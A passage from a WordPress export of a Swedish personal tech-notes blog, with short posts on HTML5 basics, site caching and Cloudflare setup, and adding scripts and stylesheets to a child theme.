		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11438256740]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[356]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[356]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>HTML5</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/06/15/html5/</link>
		<pubDate>Mon, 15 Jun 2015 10:05:02 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=362</guid>
		<description></description>
		<content:encoded><![CDATA[I html5 har ett flertal saker förenklats.

Exempel:
attributet type behövs inte längre. Här är ett exempel på skillnader.

Här är med html5.
[code lang="html"]
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
   &lt;meta charset=&quot;utf-8&quot;&gt;
   &lt;title&gt;Page Title&lt;/title&gt;
   &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;
   &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
... &lt;!-- The rest is content --&gt;
&lt;/body&gt;
&lt;/html&gt;
[/code]

Här är tidigare html.
[code lang="html"]
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
&lt;html lang=&quot;en&quot;&gt;
 &lt;head&gt;
    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html&quot; charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;title&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;script.js&quot;&gt;&lt;/script&gt;
 &lt;/head&gt;
&lt;body&gt;
...
&lt;/body&gt;
&lt;/html&gt;
[/code]

TYPE behövs inte längre, varken när man länkar script eller css.

DOCTYPE
Doctype är bra att skriva ut eftersom en modern webbläsare har flera olika rendering-engines beroende på html-versionen, så att tydligt deklarera vilken version som används kan underlätta arbetet för webb-läsaren.

meta charset="utf-8
Innebär en säkerhetsrisk om den inte skrivs ut. Om det inte skrivs ut kan Explorer tolka det som att sidan är skriven i utf-7, vilket gör att harmlös användar-input blir html-injektioner. charset ska deklareras inom de första 500-byten. <a href="https://code.google.com/p/doctype-mirror/wiki/ArticleUtf7">Här kan du läsa mer om riskerna.</a>

Här är en bra bild som beskriver de nya html5-taggarna.
<img src="https://courses.edx.org/asset-v1:W3Cx+W3C-HTML5+2015T3+type@asset+block/pictureOfStructuringElements.jpg" alt="position av html5-taggar" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1652</wp:post_id>
		<wp:post_date>2015-06-15 10:05:02</wp:post_date>
		<wp:post_date_gmt>2015-06-15 10:05:02</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>html5</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="html5"><![CDATA[html5]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11687056928]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[362]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[362]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Populärkultur 101</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/07/11/popularkultur-101/</link>
		<pubDate>Sat, 11 Jul 2015 11:52:14 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=382</guid>
		<description></description>
		<content:encoded><![CDATA[Sida som målar med dom breda penseldragen. Listar de 10 viktigaste sakerna inom populärtkulturen. Baserat på dag, vecka, månad, år, 10 år.  Man kan alltså kolla in de viktigaste modetrenderna idag, i veckan, i månaden, i år. Å så vidare inom: mode, språk (populära ord och uttryck), musik, film, datorspel.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1653</wp:post_id>
		<wp:post_date>2015-07-11 11:52:14</wp:post_date>
		<wp:post_date_gmt>2015-07-11 11:52:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>popularkultur-101</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[12623984638]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[382]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[382]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Optimering av hemsida för högre trafik och snabbhet</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/07/31/cache-och-optimering-av-hemsida/</link>
		<pubDate>Fri, 31 Jul 2015 16:07:50 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=394</guid>
		<description></description>
		<content:encoded><![CDATA[Wordpress är ett verktyg som dynamiskt återskapar hemsidor. PHP-koden kontaktar databasen och informationen hämtas upp. Det är en resurskrävande process som inte är helt nödvändig. För att hemsidan ska gå snabbare krävs en viss grad av optimering.

En snabbare sida ger högre resultat hos Google. Så en optimiserad sida ger bättre SEO.

1. Diagnos
Använd pluginen YSlow till Chrome för att ta reda på vad det är som segar ner en sida.

2. Plugin W3 Total Cache 
Ladda ner och aktivera pluginen. Sen kan du följa dessa instruktioner för att göra korrekta inställningar. <a href="http://www.wpbeginner.com/plugins/how-to-install-and-setup-w3-total-cache-for-beginners/">Här</a>. 

3. Optimera foton. Dels så att foton är korrekt storlek från början. Om fotot minskas ned med hjälp av CSS så betyder det är fotot tar mer plats än vad som egentligen är nödvändigt. Här är en populär bildoptimeringsplugin <a href="https://wordpress.org/plugins/wp-smushit/">Smush</a>.

4. Cloudflare
Cloudflare hostar inte din sida. Men om du använder Cloudflare så kommer din sida att fungera snabbare och säkrare. Det cloudflare gör är att det skapar en cachad sida av din hemsida. Så när någon ska besöka din hemsida så ser de den cachade sidan. Å eftersom Cloudflare har 24 datacenter runt om i världen så kommer besökarna automatiskt att kopplas upp mot ett datacenter som är nära dem, det gör att hastigheten blir bättre för din sida. Cloudflare kan alltså säkra att din sida visas för besökarna även om din server har packat ihop totalt, eftersom den visar en chachad version. 

4. Använd en CDN-tjänst eller annan bildtjänst till bilder. Ett exempel skulle kunna vara <a href="https://aws.amazon.com/s3/">Amazon s3</a>. 

5. <a href="https://wordpress.org/plugins/google-webfont-optimizer/">Google webfont optimizer</a>. Ej test.
Samlar ihop alla google font-requests till en request, vilket gör sidan snabbare och får bättre SEO.

6. Undersöka om Varnish kan implementeras. En annan caching-tjänst.

7. Använd pluginen: Remove Query Strings From Static Resources

8. Den här sidan kan fungera för att testa hög trafik mot en site, hur den står sig.
https://www.blitz.io/

Här finns en bra genomgång av optimering: https://premium.wpmudev.org/blog/why-trying-to-get-95-on-google-pagespeed-insights-will-drive-you-mad/]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1654</wp:post_id>
		<wp:post_date>2015-07-31 16:07:50</wp:post_date>
		<wp:post_date_gmt>2015-07-31 16:07:50</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cache-och-optimering-av-hemsida</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="optimering"><![CDATA[optimering]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13276807459]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[394]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[394]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_d5c4b7281a0490240bf38875cbff5e1c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_f6bbb3864e6a1241dcefe9ff03b1dc4f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Koppla upp en sida mot cloudflare</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/07/31/koppla-upp-en-sida-mot-cloudflare/</link>
		<pubDate>Fri, 31 Jul 2015 20:53:07 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=402</guid>
		<description></description>
		<content:encoded><![CDATA[1. Skapa ett konto på cloudflare.com om du inte redan har ett. Logga in där.

2. Skriv in domännamnet (www.exempel.se). Då kommer cloudflare att leta reda på alla DNS-information som den behöver. När det är klart så kommer cloudflare ge dig några nameserver-addresser.

3. Kopiera nameserver-adresserna och gå till den tjänst som tillhandahåller ditt domännamn. Alltså inte hostingtjänsten (om det inte är så att hostingtjänsten även tillhandahåller domännamnen). Någonstans hos tjänsten som tillhandahåller domännamn hittar du var du kan lägga till och ta bort namnserver-adresser. Klistra in de adresser som cloudflare givit dig innan. Om det finns tre adresser redan ifyllda och du bara har två adresser fårn cloudflare så ta bort den tredje adressen.

4. Så, nu är det bara att vänta typ 24 timmar å så ska allt vara klart.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1655</wp:post_id>
		<wp:post_date>2015-07-31 20:53:07</wp:post_date>
		<wp:post_date_gmt>2015-07-31 20:53:07</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>koppla-upp-en-sida-mot-cloudflare</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cloudflare"><![CDATA[cloudflare]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13283864692]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[402]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[402]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Problem med subdomän och Cloudflare</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/08/03/problem-med-subdoman-och-cloudflare/</link>
		<pubDate>Mon, 03 Aug 2015 15:52:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=412</guid>
		<description></description>
		<content:encoded><![CDATA[Om du har en domän och en subdomän och domänen är kopplad till Cloudflare så kommer subdomänen att sluta att fungera. För att lösa det så måste du lägga till subdomänen i cloudflare. Gör så här.

1. Logga in på cloudflare å klicka på huvuddomänen.

2. Klicka på ikonen för DNS.

3. Nu har du två alternativ för att koppla subdomännamnet.
a. Välj CNAME i listan till vänster. Där lägger du till subdomännamnet.
b. Lägg till A i listan till vänster, sedan subdomännamnet, å sedan IP-adressen. IP-adressen kan du hitta längre ner på sidan. Där huvuddomännamnet presenteras med tillhörande IP-adress.

Så var det klart. Här hittar du Cloudflares <a href="https://support.cloudflare.com/hc/en-us/articles/200168756-How-do-I-add-a-subdomain-">guide</a>.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1656</wp:post_id>
		<wp:post_date>2015-08-03 15:52:00</wp:post_date>
		<wp:post_date_gmt>2015-08-03 15:52:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>problem-med-subdoman-och-cloudflare</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cloudflare"><![CDATA[cloudflare]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13366275602]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[412]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[412]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hur man lägger till javascript-fil in en wordpress child</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/08/06/hur-man-lagger-till-jquery-in-en-wordpress-child/</link>
		<pubDate>Thu, 06 Aug 2015 15:17:04 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=417</guid>
		<description></description>
		<content:encoded><![CDATA[Wordpress har redan jQuery inbyggt, så du behöver bara lägga till ditt script.  

1. Gå till child-temat och gå in i filen functions.php.
Lägg där till följande kod.
<code>
function add_my_script() {
    wp_enqueue_script(
        'myscript', // namnge ditt script.
        get_stylesheet_directory_uri() . '/js/myscript.js', // lagg till korrekt adress och namn pa skriptet
        array('jquery') // this array lists the scripts upon which your script depends
    );
}
add_action( 'wp_enqueue_scripts', 'add_my_script' );

</code>

Anledningen till att det är get_stylesheet_directory_uri() och inte get_template_directory_uri() är för att detta är ett child-tema. Om det inte hade varit då, då skulle du använt get_template_directory_uri().

2. Lägg nu till namnet och korrekt adress till. I det här fallet heter skriptet myscript.js och ligger i mappen js, därför är det korrekt att skriva "/js/myscript.js".

3. Notera att i ditt script så kan du inte använda $, istället bör du använda ordet "jQuery". Här är ett exempel på ett skript och hur det bör se ut om det används i wordpress.

<code>
jQuery(document).ready(function(){
    jQuery("img").click(function(){
    jQuery("img").fadeOut("fast");
    });

});
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1657</wp:post_id>
		<wp:post_date>2015-08-06 15:17:04</wp:post_date>
		<wp:post_date_gmt>2015-08-06 15:17:04</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>hur-man-lagger-till-jquery-in-en-wordpress-child</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="jquery"><![CDATA[jQuery]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13465193745]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[417]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[417]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hur man inkluderar jQuery UI i wordpress</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/08/06/hur-man-inkluderar-jquery-ui-i-wordpress/</link>
		<pubDate>Thu, 06 Aug 2015 17:03:48 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=420</guid>
		<description></description>
		<content:encoded><![CDATA[1. Jag gjorde det fula tricket att jag helt enkelt laddade ner en plugin. Här hittar du den. <a href="https://wordpress.org/plugins/jquery-ui-widgets/installation/">Länk</a>.
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1658</wp:post_id>
		<wp:post_date>2015-08-06 17:03:48</wp:post_date>
		<wp:post_date_gmt>2015-08-06 17:03:48</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>hur-man-inkluderar-jquery-ui-i-wordpress</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="jquery"><![CDATA[jQuery]]></category>
		<category domain="category" nicename="jquery-ui"><![CDATA[jQuery UI]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13468083300]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[420]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[420]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>App-idé genus-imdb</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/08/06/app-ide-genus-imdb/</link>
		<pubDate>Thu, 06 Aug 2015 17:40:59 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=422</guid>
		<description></description>
		<content:encoded><![CDATA[En app där man kan lägga till sina filmer. Eller koppla dom till imdb-konto. Å sedan får man statistik på hur många av ens favoritfilmer är av kvinnliga och manliga regissörer/skådespelare etc.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1659</wp:post_id>
		<wp:post_date>2015-08-06 17:40:59</wp:post_date>
		<wp:post_date_gmt>2015-08-06 17:40:59</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>app-ide-genus-imdb</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13469150406]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[422]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[422]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hur man lägger till fler css-filer i en Wordpress Child Theme</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/08/17/hur-man-lagger-till-fler-css-filer-i-en-wordpress-child-theme/</link>
		<pubDate>Mon, 17 Aug 2015 18:57:45 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=432</guid>
		<description></description>
		<content:encoded><![CDATA[Du vill alltså lägga till flera css-filer i din wordpress child theme.

[code lang="php"]

add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );
function theme_enqueue_styles() {
        wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' ); //Detta är css-filen i ditt parent-theme.
        wp_enqueue_style( 'hittaPaEttNamn', get_stylesheet_directory_uri() . '/css/animations.css' );/*Där det står hittaPaEttNamn kan du själv skriva in ett namn på css-filen. Glöm inte att det ska vara get_stylesheet och inte template. Detta är för att filen finns i child-temat.*/
}

[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1660</wp:post_id>
		<wp:post_date>2015-08-17 18:57:45</wp:post_date>
		<wp:post_date_gmt>2015-08-17 18:57:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>hur-man-lagger-till-fler-css-filer-i-en-wordpress-child-theme</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13824386048]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[432]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[432]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Under konstruktion-sida i Wordpress</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/08/18/under-konstruktion-sida-i-wordpress/</link>
		<pubDate>Tue, 18 Aug 2015 19:42:35 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=437</guid>
		<description></description>
		<content:encoded><![CDATA[Ibland kan det vara bra att ha en sida som säger att din sida är under konstruktion eller, sätta sidan i Maintenance-mode ifall du måste ändra å fippla med saker. Det enkla sättet att göra det i Wordpress är genom att ladda ner pluginen: <a href="https://wordpress.org/plugins/wp-maintenance-mode/">WP Maintanence Mode</a>

